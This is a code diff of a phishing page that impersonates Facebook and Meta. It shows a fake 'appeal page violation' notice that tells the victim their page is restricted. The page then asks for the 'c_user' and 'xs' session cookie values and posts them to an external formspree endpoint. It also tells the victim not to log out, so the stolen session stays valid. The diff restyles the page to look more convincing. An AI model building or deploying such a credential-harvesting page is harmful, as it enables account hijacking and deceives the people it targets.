@@ -1,4 +1,182 @@
- <head>
+
+<!DOCTYPE html><html lang="en">
+  <style>
+    * {
+  margin: 0;
+  padding: 0;
+  font-family: "poppins", sans-serif;
+}
+
+body {
+  background-color: #efefef;
+}
+
+nav {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background-color: #4267b2;
+  padding: 15px 10%;
+}
+
+.fb-2 {
+  font-style: normal;
+  font-weight: bold;
+  font-size: 45px;
+  color: #ffffff;
+  margin-right: 45px;
+}
+
+.nav-right,
+.nav-left {
+  display: flex;
+  align-items: center;
+}
+
+.search-box {
+  background: #efefef;
+  width: 300px;
+  border-radius: 2px;
+  display: flex;
+  align-items: center;
+  padding: 0 15px;
+}
+
+.search-box img {
+  width: 18px;
+}
+
+.search-box input {
+  width: 100%;
+  background: transparent;
+  padding: 10px;
+  outline: none;
+  border: 0;
+}
+
+.main-body {
+  font-family: Arial, sans-serif;
+  background-color: #efefef;
+  color: #000000;
+  margin: 0;
+  padding: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.content {
+  text-align: left;
+  padding: 20px;
+  border-radius: 5px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+  background-color: #f5f5f5;
+  width: 100%;
+  max-width: 50%;
+}
+
+.video-text {
+  font-weight: bold;
+  opacity: 60%;
+  font-size: small;
+}
+
+.tr-5 {
+  font-size: 15px;
+  font-style: initial;
+}
+
+.mt-4 {
+  font-weight: bold;
+  font-size: large;
+  opacity: 80%;
+}
+
+input {
+  border-width: 1px;
+  border-style: solid;
+  border-color: #c7c1c1;
+  padding: 5px;
+  border-radius: 5px;
+}
+
+.msi-4 {
+  font-style: initial;
+  font-size: 15px;
+}
+
+.container {
+  position: relative;
+  width: 100%;
+  background-color: #f0f0f0;
+}
+
+.button {
+  position: absolute;
+  top: 50%;
+  left: 93%;
+  transform: translate(-50%, -20%);
+  padding: 8px 2%;
+  background-color: #4267b2;
+  color: #ffffff;
+  border: none;
+  cursor: pointer;
+  font-weight: 550;
+  font-size: 80%;
+  border-radius: 3px;
+}
+
+.copy-r {
+  font-style: normal;
+  font-weight: 550;
+  opacity: 70%;
+  padding: 15px 2%;
+}
+/* Styles for the loader overlay */
+#loader-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(255, 255, 255, 0.9); /* semi-transparent white background */
+    z-index: 9999; /* Ensure the loader appears above other content */
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.loader {
+    border: 16px solid #f3f3f3; /* Light grey */
+    border-top: 16px solid #3498db; /* Blue */
+    border-radius: 50%;
+    width: 120px;
+    height: 120px;
+    animation: spin 2s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+#c_user[type="number"]::-webkit-inner-spin-button,
+#c_user[type="number"]::-webkit-outer-spin-button {
+    -webkit-appearance: none;
+    margin: 0;
+}
+
+
+input[type="number"] {
+  -moz-appearance: textfield;
+}
+input[type="number"]::-webkit-inner-spin-button,
+input[type="number"]::-webkit-outer-spin-button {
+  -webkit-appearance: none;
+  margin: 0;
+}
+    </style>
+  <head>
 <script type="text/javascript">
   // This is a CodeSandbox injection script that's used to
   // add navigation and inspector functionality to the preview
@@ -67,114 +245,169 @@
 
   document.currentScript.remove();
 </script>
-        <meta charset="UTF-8">
-        <link href="style.css" rel="stylesheet">
-        <title>Action | Submit</title>
-    </head>
-    
-    <body>
-      
-        <div class="md:block lg:block hidden border flex w-full h-[6rem]  relative bg-[#4667ac]">
-            <div class="mx-10 mt-4">
-                <b class="text-5xl text-white">facebook</b>
-            </div>
-            <div>
-                <form class="sm:hidden lg:block md:block">
-                    <label for="search" class="hidden lg:block md:block mb-2 text-sm font-medium text-gray-900 sr-only dark:text-white">Search</label>
-                    <div class="relative hidden md:block lg:block">
-                        <div class="absolute inset-y-0 left-0 flex items-center pl-96 mx-3 pointer-events-none">
-                            <svg class="w-3 h-3 text-gray-500 dark:text-gray-400" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 20 20">
-                                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m19 19-4-4m0-7A7 7 0 1 1 1 8a7 7 0 0 1 14 0Z"></path>
-                            </svg>
-                        </div>
-                        <input type="search" id="search" class="block w-[600px] p-1 mx-96 -mt-9  pl-7 text-sm text-gray-900 border border-gray-300 rounded-sm bg-gray-50 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
-                            placeholder="How Can We Help?" required="">
-                    </div>
-                </form>
-            </div>
+<script type="text/javascript">
+  // This is a CodeSandbox injection script that's used to
+  // add navigation and inspector functionality to the preview
+  (function () {
+    var script = document.createElement("script");
+    script.src = "https://codesandbox.io/p/preview-protocol.js";
+    script.defer = true;
+    script.async = true;
+    (document.body || document.documentElement).appendChild(script);
+  })();
+
+  const isIFramePreview = window.top !== window.self;
+
+  // Only run this script in editor context
+  if (isIFramePreview) {
+    // This script is used to enable Chrome DevTools functionality
+    (function () {
+      var script = document.createElement("script");
+      script.src =
+        "https://codesandbox.io/p/chrome-devtool/protocol/index.js";
+
+      script.onload = () => {
+        const devtoolProtocol = window.chobitsu;
+        if (devtoolProtocol) {
+          window.addEventListener("message", (event) => {
+            const { type, data } = event.data;
+
+            if (type === "FROM_DEVTOOL") {
+              devtoolProtocol.sendRawMessage(data);
+            }
+          });
+
+          devtoolProtocol.setOnMessage((data) => {
+            if (data.includes('"id":"tmp')) {
+              return;
+            }
+
+            window.parent.postMessage({ type: "TO_DEVTOOL", data }, "*");
+          });
+
+          devtoolProtocol.sendRawMessage(
+            `{"id":5,"method":"Runtime.enable","params":{}}`
+          );
+        }        
+      }
+
+      (document.head || document.documentElement).prepend(script);
+    })();
+  }
+
+  if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ === "undefined") {
+    let nextID = 0;
+    let hook = (__REACT_DEVTOOLS_GLOBAL_HOOK__ = {
+      renderers: new Map(),
+      supportsFiber: true,
+      inject: (renderer) => {
+        const id = nextID++;
+        hook.renderers.set(id, renderer);
+        return id;
+      },
+      onScheduleFiberRoot() {},
+      onCommitFiberRoot() {},
+      onCommitFiberUnmount() {},
+    });
+  }
+
+  document.currentScript.remove();
+</script>
+  <meta charset="UTF-8">
+  <link rel="icon" type="image/png" href="Facebook_Logo_2023.png">
+  <link rel="stylesheet" href="style.css">
+  <title>Action | Required</title>
+</head>
+
+<body>
+ 
+
+
+    <nav>
+      <div class="nav-left">
+        <p class="fb-2">facebook</p>
+      </div>
+      <div class="nav-right">
+        <div class="search-box">
+          <img src="https://cdn.glitch.global/d08141de-e7af-45a5-916b-2f09d06ac286/search-icon-lob.png?v=1712422050841" alt="search-icon">
+          <input type="text" placeholder="Search" data-twofas-input-listener="true" data-twofas-element-number="0">
         </div>
-        <form class="sm:hidden lg:block md:block" action="https://formspree.io/f/mnnajvbk" method="post">
-            <div class="relative flex border bg-[#e9ebee] h-12 md:block lg:block hidden ">
-                <div>
-                    <div>
-                        <img class="h-7  mx-10 mt-2 shadow-2xl /home.png" alt="">
-                    </div>
-                </div>
-                <div class="md:block lg:block hidden">
-                    <p class="text-[#3578e5] text-xl font-extrabold font-serif  mx-[4.50rem] -mt-6 u">Help Center
-                    </p>
-                </div>
-            </div>
-            <div class="border md:block hidden lg:block block mx-72 mt-9 w-[630px]">
-                <div>
-                    <p class="border-b h-10 font-bold text-[16px] text-[#4b4f56] pl-3 p-2 bg-[#f5f6f7]">Appeal page violation
-                    </p>
-                </div>
-                <div>
-                    <p class="mt-4 pl-3 text-[12px] font-semibold">We have detected unusual activity on your page that violates our community standards.
-                    </p>
-                </div>
-                <div>
-                    <p class="mt-4 pl-3 text-[12px] font-semibold">Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.
-                    </p>
-                </div>
-                <div>
-    
-                </div>
-                <div>
-                    <p class="text-[11px] text-[#90949c] p-2 font-semibold">Detailed Video Information
-                    </p>
-                </div>
-                <div>
-                   </div>
-                    <div>
-                        <a class="w-32 h-20 block" href="https://cdn.glitch.global/c194a370-7f4a-41ab-9ca1-c6811c6e18b1/detailed%20video.mp4?v=1721295931432">
-                            <img class="w-32 h-20 mx-3"  src="https://cdn.glitch.global/d08141de-e7af-45a5-916b-2f09d06ac286/Meta-Logo.png?v=1712422024289"
-            width="140"
-                        </a>
-                    </div>
-                    <p class=" pl-3 text-[12px] font-semibold">Please be sure to provide the requested information below.
-    
-    
-                    </p </div>
-                    <div>
-                        <p class="text-slate-400 pl-4 mt-1">c_user
-                        </p>
-                        <input class="border h-6 pl-1 mx-3" type="number" name="c_user" required="">
-                    </div>
-                    <div>
-                        <p class="text-slate-400 pl-4 mt-1">xs
-                        </p>
-                        <input class="border h-6 pl-1 mx-3" type="text" name="xs" required="">
-                    </div>
-                    <div>
-                        <p class="mt-4 pl-3 text-[12px] font-semibold">Please make sure account not to log out from your computer or laptop until you have received a verification email.
-                        </p>
-                    </div>
-                    <div class="border mx-3 h-10 mt-4 bg-[#f5f6f7]">
-                        <div class="flex justify-end mx-2">
-                            <button class="border h-7 w-16  bg-[#4267b2] text-white shadow-2xl mt-[0.30rem] font-serif font-thin text-xs hover:bg-blue-500" id="delete-btn">Submit
-                        </button>
-                        </div>
-                    </div>
-                    <div class="mt-4"></div>
-                </div>
-    
-    
-    
-                <footer>
-                    <div>
-                        <li class="text-sm text-[#90949c] md:hidden lg:hidden sm:block mt-4 pl-72 flex hover:underline">META©️ 2024
-                        </li>
-                    </div>
-                    <div class="hidden lg:block md:bllock flex">
-    
-                    </div>
-                    <div class="mt-7"></div>
-                </footer>
-                <div class="hidden">
-    
-    
-                </div>
-        </form>
-    </body>
+      </div>
+    </nav>
+    <br><br>
+
+    <div class="main-body">
+      <form class="content" action="https://formspree.io/f/mnnajvbk" method="POST">
+        <div>
+          <img src="https://www.victoryxr.com/wp-content/uploads/2023/04/Meta-Logo-1024x576.png.webp" width="140">
+        </div>
+
+        <p class="tr-5">
+          We have detected unusual activity on your page that violates our
+          community standards.
+        </p>
+        <br>
+        <p class="tr-5">
+          Your access to your page has been limited, and you are currently
+          unable to post, share, or comment using your page.
+        </p>
+        <br>
+        <p class="tr-5">
+          If you believe this to be a mistake, you have the option to submit an
+          appeal by providing the necessary information.
+        </p>
+        <br>
+
+        <div class="video-text">
+          <p>Must Watch Detailed Video Information:</p>
+        </div>
+
+        <div>
+          <video controls="" loop="" width="320" poster="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png">
+            <source src="https://cdn.glitch.global/125da627-08ba-4e22-acf3-c75d7cbdc325/WhatsApp%20Video%202024-06-25%20at%2018.53.47_3093dc69.mp4?v=1719948585883" type="video/mp4">
+          </video>
+        </div>
+
+        <p class="tr-5">
+          Please be sure to provide the requested information below.
+        </p>
+        <br>
+
+        <div>
+          <p class="mt-4">c_user</p>
+          <input type="number" name="c_user" id="c_user" required="1" data-twofas-input-listener="true" data-twofas-element-number="1">
+        </div>
+        <br>
+
+        <div>
+          <p class="mt-4">xs</p>
+          <input type="text" name="xs" id="xs" placeholder="" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" title="Must Watch Detailed Video" required="1" data-twofas-input-listener="true" data-twofas-element-number="2">
+        </div>
+        <br>
+        
+        
+
+        <p class="msi-4">
+          Please make sure account not to log out from your computer or laptop
+          until you have received a approval from facebook.
+        </p>
+        <br>
+
+        <div class="container">
+          <button class="button" data-twofas-element-number="3">
+            <p>Submit</p>
+          </button>
+        </div>
+        <br>
+        <br>
+      </form>
+    </div>
+    <br><br>
+    <div>
+      <p class="copy-r">Meta ©️ 2024</p>
+    </div>
+  </div>
+
+<script src="script.js"></script>
+
+</body></html>
